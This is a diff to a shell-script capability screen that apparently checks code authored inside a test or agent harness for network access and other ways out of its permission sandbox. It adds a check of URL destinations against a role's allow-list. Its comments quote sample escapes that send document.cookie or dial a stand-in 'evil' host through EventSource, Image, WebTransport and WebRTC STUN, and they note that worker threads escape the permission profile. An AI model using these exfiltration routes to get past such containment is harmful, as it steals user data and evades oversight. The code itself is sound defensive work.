@@ -1076,8 +1076,8 @@ $(printf '%s' "$code" | perl -0777 -pe 's{/\*.*?\*/}{ }gs; s{(^|[^:"\x27\\])//[^
     # it made the axis unusable for any app that has one. Node exposes no
     # global Worker, so a Node worker must name worker_threads to exist.
     CAP_ID='process'; CAP_WHAT='a worker thread (worker_threads) — a worker does NOT inherit the runtime permission profile, so it is a way out of the containment that profile installs'
-  elif printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*\"[[:space:]]*(net|http|https|dgram|tls|dns|inspector)[[:space:]]*\"|from[[:space:]]*\"[[:space:]]*(net|http|https|dgram)[[:space:]]*\"|^[[:space:]]*import[[:space:]]+(socket|urllib|requests|httpx|ftplib|smtplib|telnetlib)([[:space:],.]|$)|^[[:space:]]*from[[:space:]]+(socket|urllib|requests|httpx)([[:space:].]|$)|\bfetch[[:space:]]*\(|XMLHttpRequest|WebSocket[[:space:]]*\("; then
-    CAP_ID='network'; CAP_WHAT='raw network access (net / http / socket / fetch …) — an exfiltration channel'
+  elif printf '%s' "$CODE_N" | grep -Eq "${LOAD}[[:space:]]*\([[:space:]]*\"[[:space:]]*(net|http|https|dgram|tls|dns|inspector)[[:space:]]*\"|from[[:space:]]*\"[[:space:]]*(net|http|https|dgram)[[:space:]]*\"|^[[:space:]]*import[[:space:]]+(socket|urllib|requests|httpx|ftplib|smtplib|telnetlib)([[:space:],.]|$)|^[[:space:]]*from[[:space:]]+(socket|urllib|requests|httpx)([[:space:].]|$)"; then
+    CAP_ID='network'; CAP_WHAT='raw network access (net / http / socket …) — an exfiltration channel'
   elif printf '%s' "$CODE_N" | grep -Eq "\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([[:space:]]*[\"'\`]?[a-zA-Z][a-zA-Z0-9+.-]*://|\bsendBeacon[[:space:]]*\(|\bnavigator\.sendBeacon\b" \
        && ! harness_os_code_calls_in_scope "$CODE_N" "$(harness_os_role_field "$ROLE" '.network.allow')" \
             "\.(get|post|put|patch|delete|fetch|head)"; then
@@ -1528,6 +1528,86 @@ $(printf '%s' "$code" | perl -0777 -pe 's{/\*.*?\*/}{ }gs; s{(^|[^:"\x27\\])//[^
       fi
     done < <(printf '%s' "$CODE_N" \
       | grep -oE "\.(goto|navigateTo|navigate|open|setExtraHTTPHeaders)[[:space:]]*\([^)]*\)?|\b(request|apiRequest|context)\.(get|post|put|patch|delete|fetch|head)[[:space:]]*\([^)]*\)?" 2>/dev/null)
+  fi
+
+  # AND THEN THE SAME QUESTION WITHOUT A SINK LIST AT ALL.
+  #
+  # Round 38 taught the NAVIGATION sinks to parse the call and check the
+  # destination. `fetch`, `WebSocket` and `XMLHttpRequest` kept a naive
+  # substring match in the blanket branch above — and a substring match
+  # is wrong in both directions at once. Round 50 measured both against
+  # the bench composer's real grants:
+  #
+  #   ESCAPE, inside page.evaluate, all ALLOW:
+  #     new EventSource("http://evil:1/?d=" + document.cookie)
+  #     new Image().src = "http://evil:1/e"
+  #     new WebTransport("https://evil:1/e")
+  #     new RTCPeerConnection({iceServers:[{urls:"stun:evil:1"}]})
+  #
+  #   FALSE POSITIVE, all DENY:
+  #     page.evaluate(() => fetch("/api"))            same-origin
+  #     page.evaluate(() => fetch("http://localhost:4173/api"))  in scope
+  #     expect(page.getByText("Click to fetch (beta)"))          UI TEXT
+  #
+  # The role could not assert on a button label containing `fetch(`, and
+  # could dial anywhere it liked through a constructor. The only escape
+  # hatch from the false positive was `codeCapabilities: ["network"]`, a
+  # destination-BLIND grant that throws away the `network.allow` the
+  # operator wrote — the narrow correct thing refused, the broad wrong
+  # thing the remedy.
+  #
+  # Enumerating the browser's ways to dial out is the move round 48
+  # already ruled against for Chromium's switches, and the browser grows
+  # new ones on someone else's release schedule. So this asks about the
+  # DESTINATION and never about the sink: an absolute network URL
+  # written as a literal anywhere in authored code is held to the role's
+  # network scope, whatever API it is handed to — including APIs that do
+  # not exist yet. Relative and same-origin destinations are untouched,
+  # because they reach the app under test and nothing else.
+  #
+  # What this deliberately does NOT do is guess at non-literals. A URL
+  # assembled at run time is invisible here; the sink-shaped loop above
+  # still refuses that for the calls it knows. That is a real limit and
+  # the docs state it rather than implying the surface is closed.
+  if [ -z "$CAP_ID" ]; then
+    local url_scope url_lit url_auth
+    url_scope=$(harness_os_role_field "$ROLE" '.network.allow')
+    while IFS= read -r url_lit; do
+      [ -n "$url_lit" ] || continue
+      # NOT EVERY URL HAS A `//`. WebRTC's ICE servers are spelled
+      # `stun:host:port` and `turn:host:port` — no slashes at all — so
+      # the shared URL test walked straight past
+      # `new RTCPeerConnection({iceServers:[{urls:"stun:evil:1"}]})`,
+      # which is a live dial-out to an attacker-chosen host. Normalised
+      # to the authority form before the check rather than teaching the
+      # shared helper a browser-specific shape.
+      case "$url_lit" in
+        stun:*|stuns:*|turn:*|turns:*)
+          url_lit="${url_lit%%:*}://${url_lit#*:}" ;;
+      esac
+      harness_os_is_network_url "$url_lit" || continue
+      url_auth=$(harness_os_url_authority "$url_lit")
+      [ -n "$url_auth" ] || continue
+      if [ "$url_scope" = "null" ]; then
+        CAP_ID='network'; CAP_WHAT="an absolute URL '$url_auth' written into authored code — this role declares no network scope, so no destination can be shown to be permitted. The browser and the runtime have many ways to dial a host, so this is judged by the DESTINATION rather than by which API receives it"
+        break
+      fi
+      if ! harness_os_authority_in_scope "$url_auth" "$url_scope"; then
+        CAP_ID='network'; CAP_WHAT="an absolute URL '$url_auth' written into authored code, which is outside this role's network scope ($(printf '%s' "$url_scope" | "$JQ" -r 'join(", ")' 2>/dev/null)). This is judged by the DESTINATION rather than by which API receives it, because a browser has more ways to reach a host than any list can name"
+        break
+      fi
+    #
+    # THE URL MUST BE THE WHOLE LITERAL, not a substring of one, and that
+    # line is deliberate rather than lucky. A string that IS a URL is a
+    # destination; a URL inside prose — `test("regression for
+    # https://tracker/BUG-1")`, a comment, a link in an assertion message
+    # — is documentation, and refusing those would be exactly the false
+    # positive this branch was fixed for. Leading and trailing space are
+    # allowed inside the quotes, because `fetch(" http://evil/x".trim())`
+    # is a destination with a space in front of it and nothing else.
+    done < <(printf '%s' "$CODE_N" \
+      | grep -oE '"[[:space:]]*[a-zA-Z][a-zA-Z0-9+.-]*://[^"]*"|"[[:space:]]*(stun|stuns|turn|turns):[^"]*"' 2>/dev/null \
+      | sed -E 's/^"[[:space:]]*//; s/[[:space:]]*"$//')
   fi
   # CONFIGURATION THAT IS A COMMAND. Round 25's finding, and the one
   # that says the most about what this screen is: every branch above
